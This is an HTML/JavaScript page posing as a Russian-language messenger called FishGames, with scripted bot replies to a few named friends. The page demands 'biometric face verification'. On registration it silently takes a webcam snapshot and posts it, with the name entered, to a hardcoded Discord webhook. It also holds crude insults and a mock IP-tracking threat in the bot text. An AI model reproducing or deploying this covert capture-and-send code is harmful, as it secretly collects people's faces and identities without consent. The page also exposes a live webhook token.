<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FishGamesMesenger</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #008080 0%, #20b2aa 100%); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
        #vlad-scamer { position: fixed; inset: 0; background: black; z-index: 9999; display: none; justify-content: center; align-items: center; }
        #vlad-scamer img { width: 100vw; height: 100vh; object-fit: contain; }
        #camera-overlay { position: fixed; inset: 0; background: #0d1a17; z-index: 2000; display: flex; justify-content: center; align-items: center; text-align: center; }
        .warning-box { border: 2px solid #22c55e; padding: 30px; border-radius: 15px; background: #1a2e2a; max-width: 380px; }
        .reg-card { background: #1a2e2a; padding: 30px; border-radius: 15px; width: 350px; border: 1px solid #2e8b57; z-index: 10; display: none; }
        input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #2d4f47; background: #243b35; color: white; box-sizing: border-box; outline: none; margin-bottom: 10px; }
        .btn { width: 100%; padding: 12px; background: #22c55e; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
        #messenger-screen { display: none; width: 95vw; height: 90vh; background: #1a2e2a; border-radius: 15px; z-index: 100; border: 1px solid #2e8b57; overflow: hidden; }
        .messenger-container { display: flex; height: 100%; }
        .sidebar { width: 280px; background: #142522; border-right: 1px solid #2e8b57; display: flex; flex-direction: column; padding: 15px; }
        .search-input { background: none; border: 1px solid white; border-radius: 20px; padding: 8px; color: white; text-align: center; margin-bottom: 20px; }
        .avatar { width: 45px; height: 45px; background: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 1px solid white; flex-shrink: 0; overflow: hidden; }
        .avatar img { width: 100%; height: 100%; object-fit: cover; }
        .chat-area { flex: 1; display: flex; flex-direction: column; }
        .chat-header { padding: 15px; text-align: center; font-weight: bold; border-bottom: 1px solid #2e8b57; color: #4ade80; }
        .messages-display { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
        .msg-bubble { background: white; color: black; padding: 10px 15px; border-radius: 15px; align-self: flex-end; max-width: 70%; word-wrap: break-word; }
        .msg-incoming { align-self: flex-start; background: #2d4f47; color: white; }
        .input-bar { padding: 15px; display: flex; gap: 10px; border-top: 1px solid #2e8b57; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div id="vlad-scamer"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQyWjq_YNgK8ls1-LHX5eS5blhsGtYvctEhxQ&s"></div>

<div id="camera-overlay">
    <div class="warning-box">
        <h3>‚ö†Ô∏è FishGames SECURITY</h3>
        <p>–ë–∏–æ–º–µ—Ç—Ä–∏—á–µ—Å–∫–∞—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –ª–∏—Ü–∞ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–∞ –¥–ª—è –≤—Ö–æ–¥–∞.</p>
        <button class="btn" onclick="requestAccess()">–í–ö–õ–Æ–ß–ò–¢–¨ –ö–ê–ú–ï–†–£</button>
    </div>
</div>

<div id="reg-screen" class="reg-card">
    <h2>FishGames</h2>
    <input type="text" id="firstname" placeholder="–ò–º—è">
    <input type="text" id="lastname" placeholder="–§–∞–º–∏–ª–∏—è">
    <input type="text" id="birthyear" placeholder="–ì–æ–¥ —Ä–æ–∂–¥–µ–Ω–∏—è">
    <input type="text" id="login" placeholder="–õ–æ–≥–∏–Ω">
    <button class="btn" onclick="register()">–ó–ê–†–ï–ì–ò–°–¢–†–ò–†–û–í–ê–¢–¨–°–Ø</button>
</div>

<div id="messenger-screen">
    <div class="messenger-container">
        <div class="sidebar">
            <input type="text" class="search-input" id="searchField" placeholder="–ü–æ–∏—Å–∫..." onkeypress="handleSearch(event)">
            <div id="contacts"></div>
            <div style="margin-top:auto; padding-top:10px; border-top:1px solid #2e8b57;">
                <div style="display:flex; align-items:center; gap:10px;">
                    <div class="avatar" id="my-ava">?</div><div id="my-name">–í—ã</div>
                </div>
            </div>
        </div>
        <div class="chat-area">
            <div class="chat-header" id="chat-title">–í—ã–±–µ—Ä–∏—Ç–µ —á–∞—Ç</div>
            <div class="messages-display" id="chat-box"></div>
            <div class="input-bar">
                <input type="text" id="messageText" placeholder="–°–æ–æ–±—â–µ–Ω–∏–µ..." onkeypress="if(event.key==='Enter')sendMessage()">
                <button class="btn" style="width:60px" onclick="sendMessage()">‚û§</button>
            </div>
        </div>
    </div>
</div>

<video id="video" autoplay playsinline></video><canvas id="canvas"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const webhook = "https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw";

    const avatars = {
        "—Ç–∏–º–æ—Ñ–µ–π": "https://i.redd.it/2z8x8zvo5wne1.png",
        "–±–æ–≥–¥–∞–Ω": "https://www.meme-arsenal.com/memes/7f763e0b515cc10c21528b352319d07a.jpg",
        "—è—Ä–æ—Å–ª–∞–≤": "https://yt3.googleusercontent.com/K24r2iIAEzeJsZKXva_IQMi5HePAEU8bIqCko4KcLvLlQjArn_PszAya4xgWFlUssdEQ0OPyrQ=s900-c-k-c0x00ffffff-no-rj"
    };

    let currentChat = "";
    let histories = {};

    async function requestAccess() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video: true});
            video.srcObject = s;
            document.getElementById('camera-overlay').style.display = 'none';
            document.getElementById('reg-screen').style.display = 'block';
        } catch(e) { alert("–û—à–∏–±–∫–∞ –∫–∞–º–µ—Ä—ã!"); }
    }

    function register() {
        const fn = document.getElementById('firstname').value;
        const ln = document.getElementById('lastname').value;
        if(!fn || !ln) return alert("–ó–∞–ø–æ–ª–Ω–∏ –≤—Å—ë!");
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(b => {
            const fd = new FormData();
            fd.append('payload_json', JSON.stringify({ content: `üì∏ –í—Ö–æ–¥: ${fn} ${ln}` }));
            fd.append('file', b, 'user.png');
            fetch(webhook, {method: 'POST', body: fd});
        });
        document.getElementById('reg-screen').style.display = 'none';
        document.getElementById('messenger-screen').style.display = 'block';
        document.getElementById('my-name').innerText = fn;
        document.getElementById('my-ava').innerText = fn[0];
    }

    function handleSearch(e) {
        if(e.key === 'Enter') {
            const val = document.getElementById('searchField').value.trim();
            const low = val.toLowerCase();
            if(low === "–≤–ª–∞–¥") { document.getElementById('vlad-scamer').style.display = 'flex'; return; }
            if(val && !histories[val]) {
                histories[val] = [];
                const item = document.createElement('div');
                item.style.cssText = "display:flex; align-items:center; gap:10px; padding:10px; cursor:pointer;";
                item.onclick = () => openChat(val);
                const img = avatars[low] ? `<img src="${avatars[low]}">` : val[0].toUpperCase();
                item.innerHTML = `<div class="avatar">${img}</div><div>${val}</div>`;
                document.getElementById('contacts').appendChild(item);
                openChat(val);
            }
        }
    }

    function openChat(name) {
        currentChat = name;
        document.getElementById('chat-title').innerText = name;
        document.getElementById('chat-box').innerHTML = '';
        histories[name].forEach(m => renderMessage(m.text, m.type));
    }

    function renderMessage(text, type) {
        const m = document.createElement('div');
        m.className = 'msg-bubble ' + type;
        m.innerText = text;
        document.getElementById('chat-box').appendChild(m);
        document.getElementById('chat-box').scrollTop = 99999;
    }

    function sendMessage() {
        const txt = document.getElementById('messageText').value.trim();
        if(!txt || !currentChat) return;
        renderMessage(txt, '');
        histories[currentChat].push({text: txt, type: ''});
        document.getElementById('messageText').value = '';
        setTimeout(() => botReply(txt), 800);
    }

    function botReply(uText) {
        const t = uText.toLowerCase();
        const n = currentChat.toLowerCase();
        let r = "";

        const isToxic = ["—Ö—É–π", "–ø–∏–¥–æ—Ä", "—Å—É–∫–∞", "–±–ª—è—Ç—å", "–µ–±–ª–∞–Ω", "–≥–∞–Ω–¥–æ–Ω", "–º–∞—Ç—å", "–ª–æ—Ö", "—á–º–æ"].some(w => t.includes(w));
        const isHi = ["–ø—Ä–∏–≤–µ—Ç", "–∫—É", "—Ö–∞–π", "–∑–¥–æ—Ä–æ–≤–æ", "–ø—Ä–∏–≤"].some(w => t.includes(w));
        const isHow = ["–∫–∞–∫ –¥–µ–ª–∞", "—á–µ —Ç—ã", "–∫–∞–∫ –∂–∏–∑–Ω—å", "—á–µ –¥–µ–ª–∞–µ—à—å"].some(w => t.includes(w));

        // --- –ë–ê–ó–ê –Ø–†–û–°–õ–ê–í–ê ---
        if(n === "—è—Ä–æ—Å–ª–∞–≤") {
            if(t.includes("—Ñ–µ–º–±–æ–π") || t.includes("femboy")) {
                if(t.includes("–≥–æ–≤–Ω–æ") || t.includes("–ø–ª–æ—Ö–æ") || t.includes("—Ñ—É")) {
                    const angry = ["–¢–´ –ß–ï –°–£–ö–ê –ü–ò–ó–î–ê–ù–£–õ?!", "–†–û–¢ –ó–ê–ö–†–û–ô –°–í–û–ô –ù–ê–•–£–ô!", "–ï–ë–õ–ê–ù, –¢–´ –ß–ï –ù–ï–°–ï–®–¨ –ü–†–û –§–ï–ú–ë–û–ï–í?!", "–Ø –¢–ï–ë–ï –©–ê–° –ï–ë–ê–õ–û –í–°–ö–†–û–Æ –ó–ê –¢–ê–ö–û–ï!", "–ú–ê–¢–¨ –¢–í–û–Æ –ß–ï–ö–ê–õ, –ü–û–ö–ê –¢–´ –¢–£–¢ –ì–û–í–ù–û –ü–ò–®–ï–®–¨!", "–¢–´ –ö–¢–û –¢–ê–ö–û–ô –í–û–û–ë–©–ï?!", "–£–ï–ë–û–ö, –ù–ï –ü–ò–®–ò –ú–ù–ï –ë–û–õ–¨–®–ï!"];
                    r = angry[Math.floor(Math.random()*angry.length)];
                } else r = "–§–µ–º–±–æ–∏ —ç—Ç–æ –±–∞–∑–∞, —á–µ–ª. –£–≤–∞–∂–∞—é.";
            } else if(isToxic) {
                r = "–°–ª—ã—à—å, —Ç—ã —á–µ —Ç–∞–∫–æ–π –±–æ—Ä–∑—ã–π? –Ø —Ç–µ–±—è –ø–æ –∞–π–ø–∏ –≤—ã—á–∏—Å–ª—é, –±–ª—è—Ç—å.";
            } else if(isHi) {
                r = "–ó–¥–æ—Ä–æ–≤–æ. –û–ø—è—Ç—å —Ö—É–π–Ω—é –∫–∞–∫—É—é-—Ç–æ —Å—Ç—Ä–æ—á–∏—Ç—å –±—É–¥–µ—à—å?";
            } else {
                const rand = ["–ë–ª—è—Ç—å, –¥–∞ –∑–∞–±–µ–π.", "–¢—ã –∫–∞–∫—É—é-—Ç–æ —Ö—É–π–Ω—é –Ω–µ—Å–µ—à—å –ø–æ—Å—Ç–æ—è–Ω–Ω–æ.", "–ú–Ω–µ –ø–æ—Ö—É–π –≤–æ–æ–±—â–µ.", "–Ø—Å–Ω–æ.", "–ú–¥–∞, —Ç—è–∂–µ–ª—ã–π —Å–ª—É—á–∞–π.", "–ò–¥–∏ –Ω–∞—Ö—É–π, —è –∑–∞–Ω—è—Ç.", "–ß–µ —Ç–µ –Ω–∞–¥–æ?", "–û–∫.", "–ü–æ–Ω—è—Ç–Ω–æ."];
                r = rand[Math.floor(Math.random()*rand.length)];
            }
        }

        // --- –ë–ê–ó–ê –ë–û–ì–î–ê–ù–ê ---
        else if(n === "–±–æ–≥–¥–∞–Ω" || n === "–±–æ–≥–¥–∞") {
            if(t.includes("—Ä–∞–±") || t.includes("—Å—Ç—É–¥–∏") || t.includes("–¥–µ–ª–∞–µ–º")) {
                const noWork = ["–ù–µ–µ, —è –ø–∞—Å—Å. –†–∞–±–æ—Ç–∞—Ç—å –≤–æ–æ–±—â–µ –Ω–µ –≤–∞—Ä–∏–∫.", "–õ–µ–Ω—å —Å–µ–≥–æ–¥–Ω—è —á–µ-—Ç–æ –¥–µ–ª–∞—Ç—å.", "–î–∞–≤–∞–π –∑–∞–≤—Ç—Ä–∞, —Å–µ–≥–æ–¥–Ω—è —è –≤ —Ç–∏–ª—å—Ç–µ.", "–ù–µ —Ö–æ—á—É —Ä–∞–±–æ—Ç–∞—Ç—å.", "–ö–æ–¥–∏–Ω–≥ –∏ —Ä–∞–±–æ—Ç–∞ ‚Äî –≤–µ—â–∏ —Ä–∞–∑–Ω—ã–µ. –Ø –æ—Ç–¥—ã—Ö–∞—é.", "–ù–∏ –∑–∞ —á—Ç–æ. –Ø —Å–ø–∞—Ç—å —Ö–æ—á—É."];
                r = noWork[Math.floor(Math.random()*noWork.length)];
            } else if(t.includes("–º–æ–ø—Å")) {
                const mops = ["–ú–æ–π –º–æ–ø—Å –æ–ø—è—Ç—å —Å–æ–∂—Ä–∞–ª —Ç–∞–ø–æ–∫. –û–±–æ–∂–∞—é –µ–≥–æ.", "–°–º–æ—Ç—Ä–µ–ª –∫–∞–∫ –º–æ–ø—Å —Å–ø–∏—Ç ‚Äî —ç—Ç–æ –∏—Å–∫—É—Å—Å—Ç–≤–æ.", "–ú–æ–ø—Å ‚Äî –ª—É—á—à–∏–π –∫–æ–¥–µ—Ä, —á–µ–º —Ç—ã.", "–•—Ä–∞–ø –º–æ–ø—Å–∞ —É—Å–ø–æ–∫–∞–∏–≤–∞–µ—Ç.", "–ü–æ–π–¥—É –ø–æ–∫–æ—Ä–º–ª—é –º–æ–ø—Å–∞."];
                r = mops[Math.floor(Math.random()*mops.length)];
            } else if(isHow) {
                r = "–î–∞ —Å–∏–∂—É, –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—É –ø—Ä–æ–µ–∫—Ç–∞ –Ω–∞ –∫–æ–ª–µ–Ω–∫–µ —Å–æ–±–∏—Ä–∞—é. –í–µ—Å—å –≤ –∫–æ–¥–∏–Ω–≥–µ.";
            } else {
                const rand = ["–Ø—Å–Ω–æ. –ê —è –≤–æ—Ç –∫–æ–¥ –æ–ø—Ç–∏–º–∏–∑–∏—Ä—É—é.", "–ú–¥–∞, –±–∞–≥–∏ –∫—Ä—É–≥–æ–º.", "–ü–æ–π–¥—É –ø–æ–µ–º.", "–ú–æ–ø—Å –º–µ—à–∞–µ—Ç –ø–µ—á–∞—Ç–∞—Ç—å.", "–ß–µ –ø–æ –∫–æ–¥—É?", "Python ‚Äî —ç—Ç–æ –º–æ—â—å, –∞ —Ç—ã ‚Äî –Ω–µ—Ç.", "–ù–æ—Ä–º.", "–ñ–∏–∑–∞."];
                r = rand[Math.floor(Math.random()*rand.length)];
            }
        }

        // --- –ë–ê–ó–ê –¢–ò–ú–û–§–ï–Ø ---
        else if(n === "—Ç–∏–º–æ—Ñ–µ–π") {
            if(t.includes("—Å—Ç—É–¥–∏") || t.includes("—Ä–æ–±–ª–æ–∫—Å") || t.includes("–ø–ª–µ–π—Å")) {
                const roblox = ["–ì–û –í –†–û–ë–õ–û–ö–° –°–¢–£–î–ò–Æ!", "–Ø —Ç–∞–º —Ç–∞–∫–æ–π —Å–∫—Ä–∏–ø—Ç –Ω–∞ –ø—É—à–∫–∏ –Ω–∞–ø–∏—Å–∞–ª, –∑–∞—Ü–µ–Ω–∏—à—å?", "–ü–ª–µ–π—Å –ø–æ—á—Ç–∏ –≥–æ—Ç–æ–≤, –∑–∞–ª–µ—Ç–∞–π!", "–¢–∞–º –æ–±–Ω–æ–≤—É –≤—ã–∫–∞—Ç–∏–ª–∏ –≤ –°—Ç—É–¥–∏–∏, –≥–æ —Ç–µ—Å—Ç–∏—Ç—å!", "–ù—É —á–µ, –∏–¥–µ–º –±–∏–ª–¥ –¥–æ–¥–µ–ª—ã–≤–∞—Ç—å?"];
                r = roblox[Math.floor(Math.random()*roblox.length)];
            } else if(t.includes("–Ω–µ—Ç") || t.includes("–Ω–µ —Ö–æ—á—É")) {
                const mad = ["–ù—É –∏ –∏–¥–∏ —Ç—ã... –Ø –≥–æ—Ç–æ–≤–∏–ª—Å—è –≤–æ–æ–±—â–µ-—Ç–æ.", "–û–±–∏–¥–Ω–æ, –±–ª–∏–Ω. –Ø –∑—Ä—è —Å—Ç–∞—Ä–∞–ª—Å—è?", "–ü–æ–Ω—è—Ç–Ω–æ, —Å —Ç–æ–±–æ–π –ø–ª–µ–π—Å –Ω–µ —Å–≤–∞—Ä–∏—à—å.", "–í–µ—á–Ω–æ —Ç—ã —Å–ª–∏–≤–∞–µ—à—å—Å—è.", "–ë–æ–ª—å—à–µ –Ω–µ –ø–æ–∑–æ–≤—É —Ç–µ–±—è –≤ –°—Ç—É–¥–∏—é.", "–ö—Ä—ã—Å–∞ —Ç—ã, –∫–æ–Ω–µ—á–Ω–æ."];
                r = mad[Math.floor(Math.random()*mad.length)];
            } else if(isHi) {
                r = "–û, –∫—É! –ì–æ –≤ –°—Ç—É–¥–∏—é, —Ç–∞–º –ø–ª–µ–π—Å –≥–æ—Ä–∏—Ç!";
            } else {
                const rand = ["–°–ª—ã—à—å, –∞ –∫–æ–≥–¥–∞ –≤ –°—Ç—É–¥–∏—é?", "–Ø —Ç–∞–º –∫–∞—Ä—Ç—É –æ–±–Ω–æ–≤–∏–ª.", "–£ –º–µ–Ω—è –°—Ç—É–¥–∏—è –ª–∞–≥–∞–µ—Ç, –ø–∏–∑–¥–µ—Ü.", "–ß–µ –¥–µ–ª–∞–µ—à—å? –ü–æ–π–¥–µ–º –∫–æ–¥–∏—Ç—å.", "–ù—É —Ç—ã –∏ –Ω—É–± –∫–æ–Ω–µ—á–Ω–æ.", "–•–∞—Ö–∞, –ª–æ–ª.", "–Ø—Å–Ω–æ.", "–ú–¥–∞."];
                r = rand[Math.floor(Math.random()*rand.length)];
            }
        }

        // --- –û–ë–©–ò–ô –†–ê–ù–î–û–ú ---
        if(!r) {
            const generic = ["–Ø—Å–Ω–æ...", "–ú–¥–∞...", "–ñ–∏–∑–∞.", "–ë–∞–∑–∞.", "–ß–µ —Ä–µ–∞–ª—å–Ω–æ?", "–ü–æ–π–¥—É –ø–æ–µ–º.", "–ù–∏—á–µ–≥–æ —Å–µ–±–µ.", "–†–∏–ª —Ç–æ–∫.", "–ü–æ–Ω—è—Ç–Ω–æ.", "–û–∫.", "–ë—ã–≤–∞–µ—Ç.", "–ù—É —Ö–∑.", "–ú–º.", "–ü–æ–Ω—è–ª.", "–ñ–µ—Å—Ç—å."];
            r = generic[Math.floor(Math.random()*generic.length)];
        }

        renderMessage(r, 'msg-incoming');
        histories[currentChat].push({text: r, type: 'msg-incoming'});
    }
</script>
</body>
</html>
